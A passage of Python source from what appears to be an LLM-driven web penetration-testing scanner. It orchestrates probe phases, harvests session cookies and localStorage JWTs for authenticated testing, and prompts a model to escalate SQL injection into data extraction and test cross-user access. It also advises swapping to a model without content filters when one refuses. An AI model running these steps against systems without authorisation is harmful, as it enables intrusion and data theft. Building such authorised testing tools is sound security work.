                        sorted(ab_hosts),
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (Salesforce)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(sf_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (Salesforce)",
                                      "tool_calls": len(ab_hosts) * 5, "findings": len(sf_findings)})
                    if sf_findings:
                        print(f"  [ACTIVE-BASELINE] Salesforce: {len(sf_findings)} finding(s)")

                    # ── GraphQL Introspection probe ──────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (GraphQL)", "id": "active_baseline_graphql"})
                    gql_findings = await run_graphql_introspection_probe(
                        http_client,
                        sorted(ab_hosts),
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (GraphQL)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(gql_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (GraphQL)",
                                      "tool_calls": len(ab_hosts) * 8, "findings": len(gql_findings)})
                    if gql_findings:
                        print(f"  [ACTIVE-BASELINE] GraphQL Introspection: {len(gql_findings)} finding(s)")

                    # ── HTTP Smuggling probe ──────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (HTTP Smuggling)", "id": "active_baseline_smuggling"})
                    smuggle_findings = await run_http_smuggling_probe(
                        http_client,
                        sorted(ab_hosts),
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (HTTP Smuggling)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(smuggle_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (HTTP Smuggling)",
                                      "tool_calls": len(ab_hosts) * 3, "findings": len(smuggle_findings)})
                    if smuggle_findings:
                        print(f"  [ACTIVE-BASELINE] HTTP Smuggling: {len(smuggle_findings)} finding(s)")

                    # ── OAuth/OIDC probe ──────────────────────────────
                    p = _next_phase()
                    _cb("phase_start", {"phase": p, "total": 0, "name": "Active Baseline (OAuth/OIDC)", "id": "active_baseline_oauth"})
                    oauth_findings = await run_oauth_oidc_probe(
                        http_client,
                        sorted(ab_hosts),
                        on_finding=lambda f: _cb("finding", {**f, "phase": "Active Baseline (OAuth/OIDC)"}),
                        on_progress=_ab_progress,
                        cancel_flag=cancel_flag,
                    )
                    findings.extend(oauth_findings)
                    _cb("phase_end", {"phase": p, "name": "Active Baseline (OAuth/OIDC)",
                                      "tool_calls": len(ab_hosts) * 4, "findings": len(oauth_findings)})
                    if oauth_findings:
                        print(f"  [ACTIVE-BASELINE] OAuth/OIDC: {len(oauth_findings)} finding(s)")

            except Exception as e:
                print(f"  [ACTIVE-BASELINE] Failed (non-fatal): {e}")
                logger.warning("Active baseline probe failed: %s", e, exc_info=True)

        system_prompt = build_system_prompt(target, registry, app_info, extra_domains=extra_domains)
        if passive_findings:
            passive_summary = _format_passive_for_llm(passive_findings)
            system_prompt += "\n\n" + passive_summary
        if tech_fingerprint and tech_fingerprint.get("technologies"):
            system_prompt += "\n\n" + _build_tech_context_prompt(tech_fingerprint)
        if baseline_context:
            system_prompt += "\n\n" + baseline_context
        if body_fuzz_context:
            system_prompt += "\n\n" + body_fuzz_context

        # ── Workflow Replay + Context ──
        workflow_replayed = False
        if getattr(target, "workflow_id", None):
            from .workflow import load_workflow, replay_workflow, build_workflow_prompt
            wf = load_workflow(target.workflow_id)
            if wf:
                print(f"  [WORKFLOW] Loaded workflow: {wf.name} ({len(wf.steps)} steps)")
                p = _next_phase()
                _cb("phase_start", {"phase": p, "total": 0, "name": f"Workflow Replay: {wf.name}", "id": "workflow_replay"})
                wf_vars = {"username": (target.credentials or {}).get("username", ""),
                           "password": (target.credentials or {}).get("password", "")}
                try:
                    wf_result = await replay_workflow(
                        page, wf, variables=wf_vars,
                        on_step=lambda idx, step, st: _cb("workflow_step", {"step": idx, "action": step.action, "status": st}),
                    )
                    workflow_replayed = wf_result.success
                    status = "completed" if wf_result.success else f"failed at step {wf_result.failed_step}"
                    print(f"  [WORKFLOW] Replay {status}: {wf_result.steps_completed}/{wf_result.steps_total} steps")
                    if wf_result.adapted_steps:
                        print(f"  [WORKFLOW] LLM adapted steps: {wf_result.adapted_steps}")
                except Exception as e:
                    print(f"  [WORKFLOW] Replay failed: {e}")
                    logger.warning("Workflow replay failed: %s", e, exc_info=True)
                _cb("phase_end", {"phase": p, "name": f"Workflow Replay: {wf.name}",
                                  "tool_calls": wf.steps.__len__(), "findings": 0})
                system_prompt += "\n\n" + build_workflow_prompt(wf)
            else:
                print(f"  [WORKFLOW] Workflow {target.workflow_id} not found — skipping")

        if getattr(target, "business_flow", None) and not getattr(target, "workflow_id", None):
            from .workflow import Workflow, build_workflow_prompt
            nl_wf = Workflow(name="User-Defined Business Flow", description=target.business_flow)
            system_prompt += "\n\n" + build_workflow_prompt(nl_wf)
            print(f"  [WORKFLOW] Natural language flow injected: {target.business_flow[:100]}")

        messages: list[dict] = [{"role": "system", "content": system_prompt}]

        has_baseline = bool(baseline_context)
        has_body_fuzz = bool(body_fuzz_context)
        has_workflow = workflow_replayed or bool(getattr(target, "business_flow", None))

        # ── MULTI-AGENT MODE ──────────────────────────────────────────
        # When scan_profile == "multi_agent", skip the normal sequential/
        # parallel phase pipeline and run specialist agents instead.
        _scan_profile = getattr(target, "scan_profile", "vulnerability_scan")
        if _scan_profile == "multi_agent":
            from .orchestrator import run_multi_agent_scan
            from .multi_agent_context import SharedScanContext

            print("  [MULTI-AGENT] Multi-agent mode activated — specialist agents in parallel")
            _cb("progress_msg", {"message": "[MULTI-AGENT] Running specialist agents in parallel..."})

            ma_context = SharedScanContext(
                target_url=target.url,
                hosts=list(ab_hosts) if 'ab_hosts' in dir() else [urlparse(target.url).hostname or ""],
                scan_id=getattr(target, "scan_id", ""),
                crawled_urls=metrics.get("pages_list") or [],
                auth_token=str(getattr(auth_session, "token", "")) if auth_session else "",
            )

            _ma_agent_idx = [0]
            _ma_total_agents = [15]

            def _ma_progress(event, data):
                if event == "multi_agent_start":
                    agents = data.get("agents", [])
                    _ma_total_agents[0] = len(agents)
                    _cb("scan_start", {"total_phases": len(agents)})
                    _cb("progress_msg", {"message": f"[MULTI-AGENT] Starting {len(agents)} specialist agents..."})
                elif event == "agent_start":
                    _ma_agent_idx[0] += 1
                    _cb("phase_start", {
                        "phase": _ma_agent_idx[0],
                        "total": _ma_total_agents[0],
                        "name": f"Multi-Agent ({data.get('name', data.get('agent', '?'))})",
                    })
                elif event == "agent_end":
                    _cb("phase_end", {
                        "phase": _ma_agent_idx[0],
                        "name": f"Multi-Agent ({data.get('agent', '?')})",
                        "tool_calls": data.get("tool_calls", 0),
                        "findings": data.get("findings", 0),
                    })
                elif event == "agent_step":
                    _cb("progress_msg", {
                        "message": f"[MULTI-AGENT] agent={data.get('agent','?')} step={data.get('step',0)} tool_calls={data.get('tool_calls',0)} findings={data.get('findings',0)}",
                    })
                elif event == "multi_agent_end":
                    _cb("progress_msg", {
                        "message": f"[MULTI-AGENT] Complete: {data.get('total_findings',0)} findings from {data.get('agents_run',0)} agents in {data.get('elapsed_s',0):.0f}s",
                    })
                else:
                    _cb("progress_msg", {"message": f"[MULTI-AGENT] {event}: {data}"})

            _auth_cookies = []
            if browser:
                try:
                    _ctx = page.context if page else None
                    if _ctx:
                        _auth_cookies = await _ctx.cookies()
                except Exception:
                    pass

            ma_findings = await run_multi_agent_scan(
                context=ma_context,
                model=model,
                router=router,
                tools=tools,
                tool_definitions=TOOL_DEFINITIONS,
                browser=browser,
                auth_cookies=_auth_cookies,
                registry=registry,
                allowed_domains=allowed_domains,
                auth_session=auth_session,
                exclude_urls=getattr(target, "exclude_urls", None) or [],
                on_finding=lambda f: _cb("finding", f),
                on_progress=_ma_progress,
                cancel_flag=cancel_flag,
            )
            findings.extend(ma_findings)
            print(f"  [MULTI-AGENT] Complete: {len(ma_findings)} findings from specialist agents")

            _cb("progress_msg", {"message": f"[MULTI-AGENT] {len(ma_findings)} findings from {len(ma_context.agent_metrics)} agents"})

            return findings, metrics

        # ── Split phases into sequential (recon) vs parallel (vuln testing) ──
        # Recon phases (parallel_ok=False) MUST run first sequentially.
        # Vuln testing phases (parallel_ok=True) can run concurrently.
        # attack_chain_analysis is excluded from both groups when parallel
        # mode is active — replaced by reactive CHAIN_SUB_PHASES that run
        # after the parallel vuln-testing fan-out completes.
        sequential_phases = [
            p for p in phases
            if not p.parallel_ok and p.id != "attack_chain_analysis"
        ]
        parallel_phases = [
            p for p in phases
            if p.parallel_ok and p.id != "attack_chain_analysis"
        ]
        use_parallel = (
            len(parallel_phases) > 1
            and browser is not None
            and MAX_PARALLEL_WORKERS > 1
        )
        if use_parallel:
            run_sequentially = sequential_phases
            run_in_parallel = parallel_phases
            print(f"  [PARALLEL] {len(run_sequentially)} sequential + "
                  f"{len(run_in_parallel)} parallel phases "
                  f"(max {MAX_PARALLEL_WORKERS} workers)")
        else:
            run_sequentially = phases
            run_in_parallel = []

        total_phases = _phase_seq + len(phases) + 2
        print(f"  [SCAN] Starting {len(phases)} scan phases + verification...")
        _cb("scan_start", {"total_phases": total_phases})
        for phase_idx, phase in enumerate(run_sequentially):
            _check_cancel()
            phase_num = _next_phase()
            if start_from_phase > 0 and phase_idx < start_from_phase:
                print(f"  [{phase_num}/{total_phases}] Phase: {phase.name} — skipped (already completed)")
                _cb("phase_start", {"phase": phase_num, "total": total_phases, "name": f"{phase.name} (skipped)", "id": phase.id})
                _cb("phase_end", {"phase": phase_num, "name": f"{phase.name} (skipped)", "tool_calls": 0, "findings": 0})
                metrics["phases_completed"] += 1
                continue
            phase_tool_calls = 0
            phase_findings_before = len(findings)
            print(f"  [{phase_num}/{total_phases}] Phase: {phase.name} ({phase.id})...", end="", flush=True)
            _cb("phase_start", {"phase": phase_num, "total": total_phases, "name": phase.name, "id": phase.id})

            # ── LLM Security Phase intercept (deterministic, no LLM agent) ──
            if phase.id == "web_llm_security":
                # Always re-scan all crawled URLs (including sensitive path
                # probe discoveries) for LLM endpoints.  Network-traffic-only
                # detection misses endpoints the SPA calls via JS but were
                # never triggered during passive crawling.
                from .llm_detect import match_llm_endpoints_from_urls
                _all_urls = list(metrics.get("pages_list", []))
                if hasattr(tools, "_crawled_urls"):
                    _all_urls.extend(tools._crawled_urls)
                if hasattr(tools, "get_network_log_raw"):
                    _all_urls.extend(e.get("url", "") for e in tools.get_network_log_raw())
                _existing = set((app_info or {}).get("llm_endpoints", []))
                _matched = match_llm_endpoints_from_urls(_all_urls)
                _new = [u for u in _matched if u not in _existing]
                _all_endpoints = list(_existing) + _new
                if _all_endpoints:
                    app_info = app_info or {}
                    app_info["llm_endpoints"] = _all_endpoints
                    app_info["has_llm_chat"] = True
                    print(f"\n  [LLM-SEC] All LLM endpoints ({len(_all_endpoints)}): {_all_endpoints[:8]}")
                else:
                    print(f"\n  [LLM-SEC] No LLM endpoints found in {len(_all_urls)} crawled URLs")

                # Extract authenticated cookies AND localStorage tokens from the
                # browser session so Garak and baseline probes can reach
                # auth-gated LLM endpoints.  SPAs often store JWTs in
                # localStorage rather than cookies.
                _llm_auth_headers: dict[str, str] = {}
                if page is not None:
                    try:
                        _cookies = await page.context.cookies()
                        _cookie_names = [c['name'] for c in _cookies]
                        print(f"  [LLM-SEC] Browser cookies ({len(_cookies)}): {_cookie_names[:15]}")
                        if _cookies:
                            _cookie_str = "; ".join(
                                f"{c['name']}={c['value']}" for c in _cookies
                            )
                            _llm_auth_headers["Cookie"] = _cookie_str

                            # Extract JWT from cookies for Bearer auth header
                            for c in _cookies:
                                if c['name'] in ('auth_token', 'access_token', 'jwt', 'token'):
                                    val = c['value']
                                    if val.startswith('eyJ'):
                                        _llm_auth_headers["Authorization"] = f"Bearer {val}"
                                        print(f"  [LLM-SEC] Extracted JWT from cookie '{c['name']}' for Bearer auth")
                                        break

                        # Also check localStorage for JWT/bearer tokens
                        try:
                            _ls_token = await page.evaluate("""() => {
                                const keys = Object.keys(localStorage);
                                for (const k of keys) {
                                    const v = localStorage.getItem(k);
                                    if (v && (k.toLowerCase().includes('token') ||
                                              k.toLowerCase().includes('auth') ||
                                              k.toLowerCase().includes('jwt') ||
                                              k.toLowerCase().includes('session') ||
                                              k.toLowerCase().includes('access'))) {
                                        return {key: k, value: v.substring(0, 200)};
                                    }
                                    if (v && v.startsWith('eyJ')) {
                                        return {key: k, value: v.substring(0, 200)};
                                    }
                                }
                                return null;
                            }""")
                            if _ls_token:
                                print(f"  [LLM-SEC] Found localStorage token: {_ls_token['key']}")
                                val = _ls_token['value']
                                if val.startswith('eyJ') or 'bearer' in val.lower():
                                    _llm_auth_headers["Authorization"] = f"Bearer {val}"
                                else:
                                    _llm_auth_headers["Authorization"] = f"Bearer {val}"
                            else:
                                # Dump all localStorage keys for debugging
                                _ls_keys = await page.evaluate(
                                    "() => Object.keys(localStorage)"
                                )
                                print(f"  [LLM-SEC] localStorage keys: {_ls_keys[:20]}")
                        except Exception:
                            pass

                        _hdr_summary = {k: v[:30] + '...' for k, v in _llm_auth_headers.items()}
                        print(f"  [LLM-SEC] Auth headers for LLM probes: {list(_hdr_summary.keys())}")
                    except Exception as _ce:
                        logger.debug("Cookie extraction failed (non-fatal): %s", _ce)

                try:
                    llm_findings = await _run_llm_security_phase(
                        app_info=app_info or {},
                        http_client=http_client,
                        page=page,
                        on_progress=_cb,
                        cancel_flag=cancel_flag,
                        auth_headers=_llm_auth_headers,
                    )
                    for f in llm_findings:
                        f.setdefault("phase", phase.name)
                        _cb("finding", f)
                    findings.extend(llm_findings)
                    print(f" {len(llm_findings)} findings")
                except ScanCancelled:
                    raise
                except Exception as e:
                    logger.warning("LLM security phase failed (non-fatal): %s", e)
                    print(f" ERROR: {e}")

                metrics["phases_completed"] += 1
                metrics["phase_log"].append({
                    "phase": phase.id, "name": phase.name,
                    "tool_calls": 0,
                    "findings_count": len(llm_findings) if 'llm_findings' in dir() else 0,
                })
                _cb("phase_end", {"phase": phase_num, "name": phase.name,
                                  "tool_calls": 0,
                                  "findings": len(findings) - phase_findings_before})
                continue

            phase_prompt = phase.prompt

            # ── Cross-phase findings context ──
            if phase.id == "attack_chain_analysis" and findings:
                summary_lines = []
                for i, f in enumerate(findings, 1):
                    line = f"{i}. [{_s(f.get('severity','?'))}] {_s(f.get('title','?'))} @ {_s(f.get('url','?'))}"
                    param = _s(f.get("parameter", ""))
                    pl = _s(f.get("payload", ""))
                    if param:
                        line += f" [param: {param}]"
                    if pl:
                        line += f" [payload: {pl[:100]}]"
                    ev = _s(f.get("evidence", ""))
                    if ev:
                        line += f" — {ev[:200]}"
                    summary_lines.append(line)
                findings_text = "\n".join(summary_lines) if summary_lines else "(no findings yet)"
                phase_prompt = phase_prompt.replace("{findings_summary}", findings_text)
            elif phase_idx > 0 and findings:
                ctx = _build_findings_context(findings, phase.id)
                if ctx:
                    phase_prompt += "\n\n" + ctx

            # Inject multi-identity context into authorization / session phases.
            # Old placeholders (BOLA-only) + new {multi_identity_context}.
            bola_web_placeholder = "{bola_user_b_web}"
            bola_api_placeholder = "{bola_user_b_api}"
            multi_id_placeholder = "{multi_identity_context}"
            _authz_phase_ids = {
                "web_a01", "web_bfla", "web_session_mgmt", "web_password_reset",
                "api_authz", "api_auth", "api_bfla", "api_data_exposure",
            }
            _has_any_extra = bool(_extra_identities)
            _needs_injection = (
                _has_any_extra
                and (phase.id in _authz_phase_ids
                     or bola_web_placeholder in phase_prompt
                     or bola_api_placeholder in phase_prompt
                     or multi_id_placeholder in phase_prompt)
            )
            if _needs_injection:
                id_lines: list[str] = []
                for idx_id, ident in enumerate(_extra_identities, 1):
                    hdr_str = ", ".join(f'"{k}: {v}"' for k, v in ident["header"].items()) if ident["header"] else "(none)"
                    id_lines.append(
                        f"  Identity {idx_id} — {ident['label']}:\n"
                        f"    Authorization header: {hdr_str}\n"
                        f"    Cookie: {ident['cookie'] or '(none)'}"
                    )
                id_block = "\n".join(id_lines)
                multi_block = (
                    "\n\n--- MULTI-IDENTITY TESTING MODE ---\n"
                    f"You are logged in as the PRIMARY user (User A). {len(_extra_identities)} additional "
                    "identity/ies have been authenticated:\n"
                    f"{id_block}\n\n"
                    "For EVERY sensitive endpoint / resource you discover as User A:\n"
                    "  1. Replay the request with EACH alternative identity's headers (api_request).\n"
                    "  2. If any alternative identity can access / mutate the resource → CONFIRMED finding:\n"
                    "     • Same role, different user → 'BOLA — <identity> can <action> <resource>' (Critical)\n"
                    "     • Lower role accessing higher → 'BFLA — <identity> can <action> <endpoint>' (Critical)\n"
                    "     • Different tenant accessing data → 'Cross-Tenant Access — <identity>' (Critical)\n"
                    "  3. Record: endpoint, User A's resource ID, alternative identity used, response "
                    "status + body snippet.\n"
                    "  4. For session / API-key endpoints: test cross-identity revocation "
                    "(User B revoking User A's session/key) and vice versa.\n"
                    "  5. Admin-only actions: create/delete users, change roles, manage licenses/billing "
                    "— test with every non-admin identity.\n"
                    "--- END MULTI-IDENTITY MODE ---"
                )
                phase_prompt = phase_prompt.replace(bola_web_placeholder, multi_block)
                phase_prompt = phase_prompt.replace(bola_api_placeholder, multi_block)
                phase_prompt = phase_prompt.replace(multi_id_placeholder, multi_block)
                if multi_id_placeholder not in phase.prompt and phase.id in _authz_phase_ids:
                    phase_prompt += multi_block
            else:
                phase_prompt = phase_prompt.replace(bola_web_placeholder, "")
                phase_prompt = phase_prompt.replace(bola_api_placeholder, "")
                phase_prompt = phase_prompt.replace(multi_id_placeholder, "")

            # Stage-B sibling-host coverage: announce any newly-discovered
            # in-scope sub-domains to the LLM and require it to extend
            # THIS phase's methodology to each of them. Without this
            # injection, the LLM typically only drives against the seed
            # host — so any finding class (XSS, SQLi, IDOR, auth-bypass,
            # …) that lives on a sibling sub-domain gets missed, even
            # though passive recon already TLS-audits those hosts.
            try:
                new_hosts = tools.get_discovered_hosts() - hosts_surfaced_to_llm
                # Cap per-phase announcement to keep context size bounded.
                # Newly discovered hosts that don't fit this round naturally
                # surface at the next phase's injection.
                MAX_NEW_HOSTS_PER_PHASE = 8
                if new_hosts:
                    picked = sorted(new_hosts)[:MAX_NEW_HOSTS_PER_PHASE]
                    host_lines = "\n".join(f"  - https://{h}/" for h in picked)
                    coverage_block = (
                        "\n\n--- ADDITIONAL IN-SCOPE SUB-DOMAINS (MUST COVER) ---\n"
                        "During scan reconnaissance and earlier phases the "
                        "following in-scope sub-domains were discovered via "
                        "browser network traffic (XHR / fetch / navigation):\n\n"
                        f"{host_lines}\n\n"
                        "These are part of the same application as the seed "
                        "target and may expose DISTINCT endpoints, forms, "
                        "APIs, and vulnerabilities that do not exist on the "
                        "seed host.\n\n"
                        "For the current phase "
                        f"('{phase.name}') you MUST:\n"
                        "  1. Call navigate(<host-url>) for each sub-domain "
                        "above before finishing this phase.\n"
                        "  2. Call get_links, get_forms, and intercept_requests "
                        "to enumerate each host's endpoints.\n"
                        "  3. Apply this phase's testing methodology (as "
                        "described in the instructions above) to each host — "
                        "do NOT limit testing to the seed target.\n"
                        "  4. Record every finding with the FULL host URL "
                        "so per-host coverage is auditable in the report.\n"
                        "--- END ADDITIONAL SUB-DOMAINS ---"
                    )
                    phase_prompt += coverage_block
                    hosts_surfaced_to_llm |= set(picked)
                    logger.info(
                        "Sibling-host coverage: announced %d new sub-domain(s) "
                        "to LLM for phase '%s': %s",
                        len(picked), phase.name, ", ".join(picked),
                    )
            except Exception as e:
                # Non-fatal: if host-delta plumbing fails, the phase still
                # runs against the seed target as before.
                logger.debug(
                    "Sibling-host coverage injection failed for phase %s: %s",
                    phase.id, e,
                )

            messages.append({"role": "user", "content": phase_prompt})

            phase_evidence: list[dict] = []

            for step in range(phase.max_steps):
                _check_cancel()
                try:
                    _sanitize_all_messages(messages)
                    messages = _repair_tool_pairs(messages)
                    response = router.complete(
                        model=model,
                        messages=messages,
                        tools=TOOL_DEFINITIONS,
                        cancel_flag=cancel_flag,
                    )
                except ScanCancelled:
                    raise
                except ContentFiltered:
                    logger.warning(
                        "Content filtered by %s at phase %s step %d — model guardrails blocked request",
                        model, phase.id, step,
                    )
                    print(f" [BLOCKED] Model guardrails filtered content")
                    raise ContentFiltered(
                        f"Model {model} refuses security-testing prompts (content guardrails). "
                        "Use a model without content filters (e.g. Claude Haiku or Sonnet)."
                    )
                except ContextWindowExceeded:
                    logger.warning("Context window exceeded at phase %s step %d, trimming aggressively", phase.id, step)
                    messages = trim_context(messages, max_tokens=TRIM_TARGET_TOKENS // 2)
                    try:
                        _sanitize_all_messages(messages)
                        messages = _repair_tool_pairs(messages)
                        response = router.complete(model=model, messages=messages, tools=TOOL_DEFINITIONS, cancel_flag=cancel_flag)
                    except ContentFiltered:
                        raise ContentFiltered(
                            f"Model {model} refuses security-testing prompts (content guardrails). "
                            "Use a model without content filters (e.g. Claude Haiku or Sonnet)."
                        )
                    except ContextWindowExceeded:
                        logger.error("Still exceeded after aggressive trim, skipping rest of phase %s", phase.id)
                        break
                except MalformedMessages:
                    logger.warning("Malformed message sequence at phase %s step %d, recovering", phase.id, step)
                    messages = _recover_messages(messages)
                    try:
                        response = router.complete(model=model, messages=messages, tools=TOOL_DEFINITIONS, cancel_flag=cancel_flag)
                    except MalformedMessages:
                        logger.error("Recovery failed at phase %s, skipping to next phase", phase.id)
                        break
                _check_cancel()
                if not response or not getattr(response, "choices", None):
                    logger.warning("Empty response from %s at phase %s step %d", model, phase.id, step)
                    break
                msg = response.choices[0].message
                msg_dict = msg.model_dump() if hasattr(msg, "model_dump") else dict(msg)
                msg_dict = _sanitize_message(msg_dict)
                messages.append(msg_dict)

                tool_calls = msg_dict.get("tool_calls") or getattr(msg, "tool_calls", None) or []
                unknown_in_batch = 0
                if tool_calls:
                    for tc in tool_calls:
                        _check_cancel()
                        tc_id = tc.get("id") if isinstance(tc, dict) else getattr(tc, "id", "")
                        fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", {})
                        fn_name = fn.get("name") if isinstance(fn, dict) else getattr(fn, "name", "")
                        fn_name = _sanitize_tool_name(fn_name)
                        fn_args = fn.get("arguments") if isinstance(fn, dict) else getattr(fn, "arguments", "{}")
                        result = await tools.execute(fn_name, fn_args)
                        if isinstance(result, dict) and "Unknown tool" in result.get("error", ""):
                            unknown_in_batch += 1
                        phase_tool_calls += 1
                        metrics["total_tool_calls"] += 1
                        messages.append({
                            "role": "tool",
                            "tool_call_id": tc_id,
                            "content": _cap_result(result),
                        })
                        try:
                            args_parsed = json.loads(fn_args) if isinstance(fn_args, str) else fn_args
                        except Exception:
                            args_parsed = {"raw": fn_args}
                        resp_summary = {
                            k: v for k, v in result.items()
                            if k in ("status", "url", "error", "reflected", "anomaly", "body_snippet", "results", "accessible", "title", "forms")
                        } if isinstance(result, dict) else str(result)[:200]

                        _cb("tool_call", {
                            "phase": phase.name,
                            "tool": fn_name,
                            "request": {k: str(v)[:300] for k, v in args_parsed.items()} if isinstance(args_parsed, dict) else str(args_parsed)[:400],
                            "response": {k: str(v)[:200] for k, v in resp_summary.items()} if isinstance(resp_summary, dict) else str(resp_summary)[:400],
                        })

                        if isinstance(result, dict) and result.get("skipped"):
                            blocked_url = args_parsed.get("url") or args_parsed.get("endpoint") or args_parsed.get("raw", "")
                            parsed_blocked = urlparse(blocked_url) if blocked_url else None
                            if parsed_blocked and parsed_blocked.scheme and parsed_blocked.hostname:
                                _cb("out_of_scope", {"url": blocked_url, "tool": fn_name, "phase": phase.name})

                        needs_reauth = False
                        if fn_name in ("navigate", "click") and page:
                            original = args_parsed.get("url") or target.url
                            needs_reauth = await _check_session_lost(
                                page, auth_session, target, original,
                                router=router, model=model,
                                interactive_session=interactive_session,
                                on_progress=_cb, cancel_flag=cancel_flag)
                        elif fn_name in ("api_request", "fuzz_parameter", "api_request_raw",
                                         "test_auth_bypass", "replay_with_modification"):
                            resp_status = result.get("status") if isinstance(result, dict) else None
                            if resp_status in (401, 403) and page and auth_session:
                                needs_reauth = await _check_session_lost(
                                    page, auth_session, target, target.url,
                                    router=router, model=model,
                                    interactive_session=interactive_session,
                                    on_progress=_cb, cancel_flag=cancel_flag)
                        if needs_reauth:
                            _cb("auth", {"status": "re-authenticated", "reason": "session_lost"})
                            cookies = await page.context.cookies()
                            cookie_dict = {c["name"]: c["value"] for c in cookies}
                            cookie_dict.setdefault("language", "en")
                            http_client = httpx.AsyncClient(
                                headers=auth_session.get_auth_header(),
                                cookies=cookie_dict,
                                timeout=30.0,
                            )
                            tools._http_client = http_client

                        crawl_url = None
                        if fn_name == "navigate" and result.get("url"):
                            crawl_url = result["url"]
                        elif fn_name in ("api_request", "api_request_raw"):
                            crawl_url = args_parsed.get("url") or args_parsed.get("raw", "")
                        elif fn_name in ("fuzz_parameter", "test_auth_bypass",
                                         "test_method_override"):
                            crawl_url = args_parsed.get("endpoint") or args_parsed.get("url") or ""
                        elif fn_name == "replay_with_modification":
                            req = args_parsed.get("request") if isinstance(args_parsed.get("request"), dict) else {}
                            crawl_url = req.get("url") or args_parsed.get("url") or ""
                        elif fn_name == "inject_payload":
                            crawl_url = result.get("url") or ""
                        crawl_type = _classify_url(crawl_url, result, fn_name) if crawl_url else "page"
                        if crawl_url and not crawl_url.startswith("http"):
                            crawl_url = None
                        if crawl_url and not _is_in_scope(crawl_url, allowed_domains):
                            crawl_url = None
                        if crawl_url and crawl_url not in metrics["pages_list"]:
                            metrics["pages_list"].append(crawl_url)
                            metrics["pages_crawled"] += 1
                            _cb("crawl", {"url": crawl_url, "type": crawl_type, "tool": fn_name, "count": metrics["pages_crawled"]})
                        if fn_name == "get_forms" and result.get("forms"):
                            metrics["forms_found"] += len(result["forms"])
                        elif fn_name in ("get_network_log", "intercept_requests"):
                            registry.add_from_traffic(result)
                        is_security_test = fn_name in SECURITY_TEST_TOOLS
                        if not is_security_test and fn_name == "navigate":
                            nav_url = (args_parsed.get("url") or "") if isinstance(args_parsed, dict) else ""
                            if any(m in nav_url for m in _INJECTION_MARKERS):
                                is_security_test = True
                        if is_security_test:
                            metrics["test_log"].append({
                                "phase": phase.id,
                                "tool": fn_name,
                                "request": args_parsed,
                                "response_summary": resp_summary,
                            })
                            _capture_evidence(phase_evidence, fn_name, args_parsed, resp_summary, result)
                    if unknown_in_batch > 0 and unknown_in_batch == len(tool_calls):
                        correction = (
                            " | IMPORTANT: All tool calls in this batch were invalid. "
                            "Use ONLY the tools listed in your system prompt. "
                            "Do NOT invent tool names."
                        )
                        if messages and messages[-1].get("role") == "tool":
                            messages[-1]["content"] = str(messages[-1].get("content", "")) + correction
                        else:
                            messages.append({"role": "user", "content": correction.strip(" |")})
                    if phase_tool_calls % 5 == 0 and _estimate_tokens(messages) > TRIM_TARGET_TOKENS:
                        messages = trim_context(messages, max_tokens=TRIM_TARGET_TOKENS)
                else:
                    content = msg_dict.get("content") or getattr(msg, "content", "") or ""
                    if not isinstance(content, str):
                        content = json.dumps(content) if isinstance(content, (dict, list)) else str(content)
                    snippet = content[:300].replace("\n", " ").strip()
                    _cb("tool_call", {
                        "phase": phase.name,
                        "tool": "[LLM analysis]",
                        "request": {"prompt": phase.prompt[:120] + "..." if len(phase.prompt) > 120 else phase.prompt},
                        "response": {"text": snippet[:200] + "..." if len(snippet) > 200 else snippet},
                    })

                    # Check if the LLM has done enough security testing
                    security_calls = sum(
                        1 for t in metrics.get("test_log", [])
                        if t.get("phase") == phase.id
                    )
                    min_calls = _MIN_SECURITY_CALLS.get(phase.id, 0)
                    if security_calls < min_calls and step < phase.max_steps - 5:
                        continuation = (
                            f"STOP — you have only performed {security_calls} security test calls "
                            f"but this phase requires at least {min_calls}. You MUST continue testing.\n"
                            "DO NOT output findings yet. Instead:\n"
                            "1. Use fuzz_parameter to send MULTIPLE payloads to DIFFERENT endpoints\n"
                            "2. Test the LOGIN endpoint with injection payloads (api_request POST)\n"
                            "3. Navigate to MORE pages and test their inputs (search, profile, order tracking)\n"
                            "4. Call get_network_log to find API endpoints you haven't tested yet\n"
                            "5. If you found an error/vulnerability, ESCALATE — try UNION SELECT, data extraction\n"
                            "6. Test URL parameters on SPA routes (navigate to /#/route?param=PAYLOAD)\n"
                            "Keep going until you've tested at least " + str(min_calls) + " distinct test calls."
                        )
                        logger.info(
                            "Phase %s: only %d/%d security calls, forcing continuation at step %d",
                            phase.name, security_calls, min_calls, step,
                        )
                        messages.append({"role": "user", "content": continuation})
                        continue

                    new_f = extract_findings(str(content))

                    rejected = extract_findings(str(content), require_evidence=False)
                    has_ungrounded = len(rejected) > len(new_f)

                    if has_ungrounded and phase_evidence:
                        evidence_text = _format_evidence_buffer(phase_evidence)
                        logger.info(
                            "Phase %s: %d findings lacked evidence, retrying with %d evidence records",
                            phase.name, len(rejected) - len(new_f), len(phase_evidence),
                        )
                        messages.append({"role": "user", "content": evidence_text})
                        try:
                            _check_cancel()
                            retry_resp = router.complete(
                                model=model,
                                messages=messages,
                                tools=[],
                                cancel_flag=cancel_flag,
                            )
                            if retry_resp and getattr(retry_resp, "choices", None):
                                retry_content = retry_resp.choices[0].message.content or ""
                                retry_f = extract_findings(str(retry_content))
                                if retry_f:
                                    new_f = retry_f
                                    logger.info("Evidence retry produced %d grounded findings", len(retry_f))
                        except Exception as e:
                            logger.warning("Evidence retry failed: %s", e)

                    findings.extend(new_f)
                    for f in new_f:
                        f["phase"] = phase.name
                        _match_evidence_to_finding(f, phase_evidence)
                        _cb("finding", f)
                    break

            phase_new_findings = len(findings) - phase_findings_before

            # ── Post-phase recovery: active retry OR passive evidence summary ──
            _ACTIVE_RETRY_PHASES = {
                "web_a01", "web_a07", "web_a10",
                "web_a03_sqli", "web_a03_xss", "web_a03_cmdi",
